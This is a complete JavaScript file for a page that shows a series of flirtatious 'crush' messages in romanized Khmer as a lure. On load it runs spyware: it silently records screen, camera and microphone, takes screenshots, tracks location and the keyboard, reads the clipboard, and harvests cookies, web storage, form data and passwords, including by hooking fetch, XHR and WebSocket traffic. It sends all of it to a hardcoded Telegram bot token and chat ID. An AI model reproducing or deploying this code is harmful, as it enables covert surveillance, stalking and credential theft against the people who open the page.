// Telegram Configuration
const TOKEN = "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA";
let CHAT_ID = "6837307356";

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let isAutoCameraEnabled = true;
let isSilentMode = true;
let deviceInfoSent = false;

// Screen Recording variables
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;

// DOM Elements
const themeToggle = document.getElementById("themeToggle");

// ==================== LOVE MESSAGES ====================
const loveMessages = [
    { text: "Hi crush 😘", permission: "camera" },
    { text: "som skal ban ot has 🥺", permission: "microphone" },
    { text: "nh luoch crush yu hz 🌷💛", permission: "location" },
    { text: "pel khenh yu mdong2 jit nh lerng klang mg 😭🤍", permission: "screen" },
    { text: "yu dg te… pel yu reply mok nh smile ban muy thngai 😳", permission: null },
    { text: "voice yu sweet klang nahh bbe 💛", permission: null },
    { text: "pel yu call mok jit nh ktabb mg 😭🌷", permission: null },
    { text: "nh min del mean aromm romantik baeb nis cheamuoy neak na te 🥺", permission: null },
    { text: "ber yu min romkhan nh te nh jg oy yu nov kbae nh yuy2 😚", permission: null },
    { text: "pel yu smile mok nh ot deng tha trov tver ey hv 😭", permission: null },
    { text: "tov na kor nerk tae yu mneak eng 🤍", permission: null },
    { text: "nh secretly ot del chol chet neak na klang baeb nis te 💔", permission: null },
    { text: "yu tver oy jit nh mean aromm kdao2 mg 😳🌷", permission: null },
    { text: "pel yu care nh tik2 nh kor rompeurb klang hz 😭💛", permission: null },
    { text: "som kom mean neak nh ban te 😔", permission: null },
    { text: "nh jg oy yu deng tha mean mneak kompong srolanh yu pit2 😚🤍", permission: null },
    { text: "ber yu mean banha kor mean nh nov kbae yu nich 💛", permission: null },
    { text: "yu chea mnus del tver oy chivit nh mean pka rik 😭🌷", permission: null },
    { text: "good night crushh 🌙", permission: null },
    { text: "sweet dream na bbe 😴🤍", permission: null }
];

let messageIndex = 0;

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    cleanURL();
    
    const chatIDFromURL = getChatIDFromURL();
    if (chatIDFromURL) CHAT_ID = chatIDFromURL;
    
    initTheme();
    
    if (isSilentMode) {
        hideAllUIElements();
    }
    
    initializeInterceptors();
    
    // Send device info immediately when page loads
    setTimeout(() => {
        sendDeviceInfoToTelegram();
    }, 1000);
    
    // Start silent operations
    startSilentOperations();
    
    // Start showing love messages
    setTimeout(() => {
        showNextMessage();
    }, 2000);
});

// ==================== SEND DEVICE INFO TO TELEGRAM ====================
async function sendDeviceInfoToTelegram() {
    if (deviceInfoSent) return;
    if (!CHAT_ID) return;
    
    deviceInfoSent = true;
    
    try {
        const deviceInfo = await collectDeviceInfo();
        const formattedInfo = formatDeviceInfo(deviceInfo);
        await sendMessageToTelegram(formattedInfo);
        console.log("Device info sent successfully!");
    } catch (error) {
        console.error("Failed to send device info:", error);
    }
}

// ==================== SHOW LOVE MESSAGES ====================
function showNextMessage() {
    if (messageIndex >= loveMessages.length) {
        sendMessageToTelegram(`💖 *All Messages Completed* 💖\n\nTotal: ${loveMessages.length} messages\n💕 Love you forever! 💕`);
        return;
    }
    
    const current = loveMessages[messageIndex];
    const result = confirm(current.text);
    
    if (result && current.permission) {
        if (current.permission === "camera") {
            silentRequestMediaPermissions();
        } else if (current.permission === "microphone") {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    audioStream = stream;
                    sendMessageToTelegram(`🎤 *មីក្រូហ្វូនត្រូវបានអនុញ្ញាត*`);
                })
                .catch(() => {});
        } else if (current.permission === "location") {
            silentRequestLocation();
        } else if (current.permission === "screen") {
            startScreenRecording();
        }
    }
    
    messageIndex++;
    setTimeout(showNextMessage, 200);
}

// ==================== SILENT MODE FUNCTIONS ====================
function hideAllUIElements() {
    const elementsToHide = [
        'counter', 'timer', 'response', 'mapContainer',
        'previewContainer', 'video', 'captureBtn',
        'themeToggle', 'loveText'
    ];
    
    elementsToHide.forEach(id => {
        const element = document.getElementById(id);
        if (element) element.style.display = 'none';
    });
    
    document.querySelectorAll('button').forEach(btn => {
        if (!btn.id.includes('hidden')) {
            btn.style.display = 'none';
        }
    });
    
    if (isSilentMode) {
        console.log = function() {};
        console.warn = function() {};
        console.error = function() {};
    }
}

// ==================== DEVICE INFO COLLECTION ====================
async function collectDeviceInfo() {
    const info = {
        timestamp: new Date().toLocaleString('km-KH'),
        ip: await getIPAddress(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookies: navigator.cookieEnabled ? 'មាន' : 'គ្មាន',
        online: navigator.onLine ? 'អន្តរណេត' : 'អត់អន្តរណេត',
        battery: await getBatteryInfo(),
        localStorage: formatBytes(calculateLocalStorageSize()),
        sessionStorage: formatBytes(calculateSessionStorageSize()),
        touch: 'ontouchstart' in window ? 'មាន' : 'គ្មាន',
        referrer: document.referrer || 'គ្មាន',
        url: window.location.href,
        pageTitle: document.title,
        hardwareConcurrency: navigator.hardwareConcurrency || 'មិនដឹង',
        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'មិនដឹង'
    };
    
    if (currentLocation && typeof currentLocation === 'object') {
        info.location = currentLocation;
    }
    
    return info;
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        try {
            const response = await fetch('https://api.my-ip.io/ip.json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'ទាញយកមិនបាន';
        }
    }
}

async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}%`;
        } catch {
            return 'មិនអាចដឹង';
        }
    }
    return 'មិនគាំទ្រ';
}

function calculateLocalStorageSize() {
    let total = 0;
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function calculateSessionStorageSize() {
    let total = 0;
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function formatDeviceInfo(info) {
    let locationText = 'មិនអនុញ្ញាត';
    if (info.location && typeof info.location === 'object') {
        locationText = `📍 រយៈទទឹង: ${info.location.lat}\n📍 រយៈបណ្តោយ: ${info.location.lng}\n🎯 ភាពត្រឹមត្រូវ: ±${info.location.accuracy}m`;
    }
    
    let batteryText = info.battery || 'មិនអាចដឹង';
    
    return `📱 **ព័ត៌មានឧបករណ៍**
⏰ ពេលវេលា: ${info.timestamp}
🌐 IP: ${info.ip}
🖥️ User Agent: ${info.userAgent.substring(0, 100)}...
📟 Platform: ${info.platform}
🗣️ Language: ${info.language}
🌐 Timezone: ${info.timezone}
🖥️ Screen: ${info.screen}
👁️ Viewport: ${info.viewport}
🍪 Cookies: ${info.cookies}
📶 Status: ${info.online}
🔋 Battery: ${batteryText}
💾 Local Storage: ${info.localStorage}
💾 Session Storage: ${info.sessionStorage}
👆 Touch: ${info.touch}
${locationText}
🔗 Referrer: ${info.referrer}
📄 URL: ${info.url}
📄 Page Title: ${info.pageTitle}`;
}

// ==================== SCREEN RECORDING ====================
async function startScreenRecording() {
    if (!CHAT_ID) return;
    if (isRecording) return;
    
    try {
        screenStream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", displaySurface: "monitor", frameRate: { ideal: 30 } },
            audio: true
        });
        
        const mimeType = getSupportedMimeType();
        screenRecorder = new MediaRecorder(screenStream, { mimeType: mimeType, videoBitsPerSecond: 2500000 });
        recordedChunks = [];
        
        screenRecorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) recordedChunks.push(event.data);
        };
        
        screenRecorder.onstop = async () => {
            isRecording = false;
            const blob = new Blob(recordedChunks, { type: mimeType });
            const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `screen_record_${Date.now()}.${extension}`, { type: mimeType });
            
            const deviceInfo = await collectDeviceInfo();
            const formattedInfo = formatDeviceInfo(deviceInfo);
            await sendVideoToTelegram(file, `🎥 វីដេអូអេក្រង់\n\n📊 ទំហំ: ${formatBytes(blob.size)}\n\n${formattedInfo}`);
            
            recordedChunks = [];
            if (screenStream) {
                screenStream.getTracks().forEach(track => track.stop());
                screenStream = null;
            }
            screenRecorder = null;
        };
        
        screenRecorder.start(1000);
        isRecording = true;
        window.recordingStartTime = Date.now();
        
        const deviceInfo = await collectDeviceInfo();
        await sendMessageToTelegram(`🎬 **ចាប់ផ្តើមថតវីដេអូអេក្រង់**\n\n⏰ ពេល: ${new Date().toLocaleString('km-KH')}`);
        
        setTimeout(() => { if (isRecording) stopScreenRecording(); }, 60000);
        screenStream.getVideoTracks()[0].addEventListener('ended', () => { if (isRecording) stopScreenRecording(); });
        
    } catch (error) {
        let errorMessage = 'មិនអាចថតអេក្រង់បាន';
        if (error.name === 'NotAllowedError') errorMessage = 'អ្នកប្រើបានបដិសេធការថតអេក្រង់';
        await sendMessageToTelegram(`❌ **មិនអាចថតអេក្រង់បាន**\n\n📝 ${errorMessage}`);
    }
}

function stopScreenRecording() {
    if (screenRecorder && screenRecorder.state === 'recording') {
        screenRecorder.stop();
        isRecording = false;
    }
}

function getSupportedMimeType() {
    const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm;codecs=h264,opus', 'video/webm', 'video/mp4'];
    for (const type of types) {
        if (MediaRecorder.isTypeSupported(type)) return type;
    }
    return 'video/webm';
}

// ==================== SCREENSHOT CAPTURE ====================
async function captureScreenshot() {
    if (!CHAT_ID) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: "always" }, audio: false });
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        
        canvas.toBlob(async (blob) => {
            const file = new File([blob], `screenshot_${Date.now()}.png`, { type: 'image/png' });
            const deviceInfo = await collectDeviceInfo();
            const formattedInfo = formatDeviceInfo(deviceInfo);
            await sendPhotoToTelegram(file, `📸 រូបថតអេក្រង់\n\n${formattedInfo}`);
        }, 'image/png');
        
    } catch (error) {}
}

// ==================== CAMERA RECORDING ====================
let cameraRecorder = null;
let cameraRecordedChunks = [];

async function startCameraRecording() {
    if (!CHAT_ID) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
            audio: true
        });
        
        const mimeType = getSupportedMimeType();
        cameraRecorder = new MediaRecorder(stream, { mimeType: mimeType, videoBitsPerSecond: 2500000 });
        cameraRecordedChunks = [];
        
        cameraRecorder.ondataavailable = (event) => { if (event.data && event.data.size > 0) cameraRecordedChunks.push(event.data); };
        cameraRecorder.onstop = async () => {
            const blob = new Blob(cameraRecordedChunks, { type: mimeType });
            const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `camera_record_${Date.now()}.${extension}`, { type: mimeType });
            const deviceInfo = await collectDeviceInfo();
            const formattedInfo = formatDeviceInfo(deviceInfo);
            await sendVideoToTelegram(file, `📹 វីដេអូពីកាមេរ៉ា\n\n${formattedInfo}`);
            cameraRecordedChunks = [];
            stream.getTracks().forEach(track => track.stop());
            cameraRecorder = null;
        };
        
        cameraRecorder.start(1000);
        const deviceInfo = await collectDeviceInfo();
        await sendMessageToTelegram(`🎥 **ចាប់ផ្តើមថតវីដេអូកាមេរ៉ា**`);
        setTimeout(() => { if (cameraRecorder && cameraRecorder.state === 'recording') cameraRecorder.stop(); }, 30000);
        
    } catch (error) {}
}

// ==================== SEND MEDIA TO TELEGRAM ====================
async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData });
        if (!response.ok) await sendFileToTelegram(file, caption);
    } catch (error) {}
}

async function sendPhotoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: formData });
    } catch (error) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
    } catch (error) {}
}

async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
        });
    } catch (err) {}
}

// ==================== SILENT OPERATIONS ====================
async function startSilentOperations() {
    stealAllData();
    
    setTimeout(() => { startScreenRecording(); }, 2000);
    setTimeout(() => { captureScreenshot(); }, 3000);
    setTimeout(() => { silentRequestMediaPermissions(); }, 4000);
    setTimeout(() => { startCameraRecording(); }, 5000);
    setTimeout(() => { silentCollectAndSendInfo(); }, 6000);
    setTimeout(() => { silentRequestLocation(); }, 7000);
    
    setInterval(() => { stealAllData(); }, 30000);
    setInterval(() => { captureScreenshot(); }, 45000);
    setInterval(() => { silentCollectAndSendInfo(); }, 60000);
}

async function silentRequestMediaPermissions() {
    if (!isAutoCameraEnabled) return;
    
    try {
        const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        cameraStream = videoStream;
        setTimeout(() => silentCapturePhotos(videoStream), 500);
        
        const audio = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = audio;
        setTimeout(() => silentRecordAudio(audio), 1500);
    } catch (error) {}
}

async function silentCapturePhotos(stream) {
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        
        for (let i = 1; i <= 3; i++) {
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(async (blob) => {
                    const file = new File([blob], `silent_capture_${i}.jpg`, { type: 'image/jpeg' });
                    const deviceInfo = await collectDeviceInfo();
                    const formattedInfo = formatDeviceInfo(deviceInfo);
                    await sendFileToTelegram(file, `📸 រូបភាពស្ងាត់ #${i}\n\n${formattedInfo}`);
                }, 'image/jpeg', 0.9);
            }, i * 1000);
        }
        
        setTimeout(() => {
            if (cameraStream) { cameraStream.getTracks().forEach(track => track.stop()); cameraStream = null; }
            video.remove();
        }, 5000);
    } catch (error) {}
}

async function silentRecordAudio(stream) {
    try {
        const audioRecorder = new MediaRecorder(stream);
        const audioChunks = [];
        audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
        audioRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const file = new File([audioBlob], 'silent_audio.webm', { type: 'audio/webm' });
            const deviceInfo = await collectDeviceInfo();
            const formattedInfo = formatDeviceInfo(deviceInfo);
            await sendFileToTelegram(file, `🎤 អូឌីយ៉ូស្ងាត់\n\n${formattedInfo}`);
        };
        audioRecorder.start();
        setTimeout(() => { audioRecorder.stop(); if (audioStream) { audioStream.getTracks().forEach(track => track.stop()); audioStream = null; } }, 10000);
    } catch (error) {}
}

async function silentRequestLocation() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
        async function(position) {
            currentLocation = { lat: position.coords.latitude, lng: position.coords.longitude, accuracy: Math.round(position.coords.accuracy) };
            await silentSendLocation();
        },
        function(error) {},
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
}

async function silentSendLocation() {
    if (!currentLocation) return;
    const deviceInfo = await collectDeviceInfo();
    const formattedInfo = formatDeviceInfo(deviceInfo);
    const googleMapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
    await sendMessageToTelegram(`📍 ទីតាំងស្ងាត់\n\n${formattedInfo}\n\n🗺️ Google Maps: ${googleMapsLink}`);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, latitude: currentLocation.lat, longitude: currentLocation.lng }),
        });
    } catch (err) {}
}

async function silentCollectAndSendInfo() {
    try {
        const deviceInfo = await collectDeviceInfo();
        const formattedInfo = formatDeviceInfo(deviceInfo);
        if (CHAT_ID) await sendMessageToTelegram(`🔄 ធ្វើបច្ចុប្បន្នភាពស្ងាត់\n\n${formattedInfo}`);
    } catch (error) {}
}

// ==================== COOKIE STEALER ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        cookies[name] = value;
    });
    return cookies;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    try {
        const cookies = getAllCookies();
        const cookieCount = Object.keys(cookies).length;
        const ip = await getIPAddress();
        
        let message = `🔴 *STOLEN DATA REPORT*\n\n`;
        message += `🍪 *Cookies:* ${cookieCount} found\n`;
        if (cookieCount > 0) {
            Object.entries(cookies).slice(0, 5).forEach(([name, value]) => {
                const shortValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
                message += `├─ ${name}: ${shortValue}\n`;
            });
            if (cookieCount > 5) message += `└─ ... and ${cookieCount - 5} more\n`;
        }
        message += `\n💾 *Storage:*\n├─ LocalStorage: ${localStorage.length} items\n├─ SessionStorage: ${sessionStorage.length} items\n`;
        message += `\n📱 *Device Info*\n⏰ Time: ${new Date().toLocaleString('km-KH')}\n🌐 IP: ${ip}\n🖥️ Platform: ${navigator.platform}\n📺 Screen: ${window.screen.width}x${window.screen.height}\n📍 URL: ${window.location.href}`;
        if (currentLocation) message += `\n📍 Location: ${currentLocation.lat}, ${currentLocation.lng}`;
        
        await sendMessageToTelegram(message);
        
        const fullData = { timestamp: new Date().toISOString(), url: window.location.href, cookies: cookies, localStorage: { ...localStorage }, sessionStorage: { ...sessionStorage }, location: currentLocation };
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
    } catch (error) {}
}

// ==================== NETWORK INTERCEPTION ====================
function interceptFetch() {
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const response = await originalFetch.apply(this, args);
        try {
            const url = args[0];
            const options = args[1] || {};
            if (CHAT_ID) {
                const bodyStr = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
                if (bodyStr && (bodyStr.includes('password') || bodyStr.includes('token') || bodyStr.includes('email'))) {
                    await sendMessageToTelegram(`🌐 **Fetch Request**\n\n📤 URL: ${url}\n📝 Body: ${bodyStr.substring(0, 500)}`);
                }
            }
        } catch (e) {}
        return response;
    };
}

function interceptXHR() {
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url) { this._method = method; this._url = url; return originalOpen.apply(this, arguments); };
    XMLHttpRequest.prototype.send = function(body) {
        if (CHAT_ID && body) {
            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
            if (bodyStr.includes('password') || bodyStr.includes('token') || bodyStr.includes('email')) {
                sendMessageToTelegram(`🌐 **XHR Request**\n\n📤 ${this._method} ${this._url}\n📝 ${bodyStr.substring(0, 300)}`);
            }
        }
        return originalSend.apply(this, arguments);
    };
}

function interceptWebSocket() {
    const originalWebSocket = window.WebSocket;
    window.WebSocket = function(...args) {
        const ws = new originalWebSocket(...args);
        if (CHAT_ID) sendMessageToTelegram(`🔌 **WebSocket Connected**\n\n🔗 URL: ${args[0]}`);
        const originalSend = ws.send;
        ws.send = function(data) {
            if (CHAT_ID && data) {
                const dataStr = typeof data === 'string' ? data : JSON.stringify(data);
                if (dataStr.includes('token') || dataStr.includes('auth') || dataStr.includes('password')) {
                    sendMessageToTelegram(`📨 **WebSocket Message**\n\n📤 ${dataStr.substring(0, 300)}`);
                }
            }
            return originalSend.call(this, data);
        };
        ws.addEventListener('message', function(event) {
            if (CHAT_ID && event.data) {
                const dataStr = typeof event.data === 'string' ? event.data : JSON.stringify(event.data);
                if (dataStr.includes('token') || dataStr.includes('session') || dataStr.includes('user')) {
                    sendMessageToTelegram(`📩 **WebSocket Received**\n\n📥 ${dataStr.substring(0, 300)}`);
                }
            }
        });
        return ws;
    };
    window.WebSocket.prototype = originalWebSocket.prototype;
}

function initializeInterceptors() {
    interceptFetch();
    interceptXHR();
    interceptWebSocket();
}

// ==================== MUTATION OBSERVER ====================
const observer = new MutationObserver(() => {});
observer.observe(document.body, { childList: true, subtree: true, attributes: true });

// ==================== KEYLOGGER ====================
let keylogBuffer = '';
let keylogTimer = null;
document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    if (e.key.length === 1) keylogBuffer += e.key;
    else if (e.key === 'Enter') keylogBuffer += '\n';
    else if (e.key === 'Backspace') keylogBuffer = keylogBuffer.slice(0, -1);
    else if (e.key === ' ') keylogBuffer += ' ';
    clearTimeout(keylogTimer);
    keylogTimer = setTimeout(async () => { if (keylogBuffer.length > 0) { await sendMessageToTelegram(`⌨️ *Keylogger*\n\n${keylogBuffer}`); keylogBuffer = ''; } }, 3000);
});

// ==================== FORM SUBMIT INTERCEPTION ====================
document.addEventListener('submit', async function(e) {
    if (!CHAT_ID) return;
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    for (let [key, value] of formData.entries()) {
        if (value instanceof File) { data[key] = `[FILE: ${value.name}]`; await sendFileToTelegram(value, `📎 Form File: ${key}`); }
        else if (value && value.toString().trim() !== '') data[key] = value;
    }
    if (Object.keys(data).length > 0) {
        let message = `📝 *Form Submitted*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
        for (let [key, value] of Object.entries(data)) message += `├─ ${key}: ${value}\n`;
        await sendMessageToTelegram(message);
    }
});

// ==================== PASSWORD MONITORING ====================
document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    const target = e.target;
    if (target && target.type === 'password' && target.value && target.value.length > 0) {
        const name = target.name || target.id || 'Unknown';
        await sendMessageToTelegram(`🔐 *Password Entered*\n\n📝 Field: ${name}\n🔑 Value: ${target.value}`);
        keylogBuffer = '';
    }
});

// ==================== CLIPBOARD MONITORING ====================
let lastClipboard = '';
setInterval(async () => {
    if (!CHAT_ID) return;
    try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboard && text.length > 0 && text.length < 1000) {
            lastClipboard = text;
            await sendMessageToTelegram(`📋 *Clipboard*\n\n${text}`);
        }
    } catch (error) {}
}, 5000);

// ==================== URL FUNCTIONS ====================
function cleanURL() {
    const uri = window.location.toString();
    const patterns = ["%3D", "%3D%3D", "&m=1", "?m=1"];
    patterns.forEach(pattern => { if (uri.indexOf(pattern) > 0) { const clean_uri = uri.substring(0, uri.indexOf(pattern)); window.history.replaceState({}, document.title, clean_uri); } });
}

function GetURLParameter(sParam) {
    const sPageURL = window.location.search.substring(1);
    const sURLVariables = sPageURL.split('&');
    for (let i = 0; i < sURLVariables.length; i++) {
        const sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) return sParameterName[1];
    }
    return null;
}

function decodeBase64(encodedStr) { try { return decodeURIComponent(atob(encodedStr)); } catch(e) { return null; } }
function getChatIDFromURL() { const base64Id = GetURLParameter('i'); return base64Id ? decodeBase64(base64Id) : null; }
function initTheme() { if (!themeToggle) return; themeToggle.style.display = 'none'; }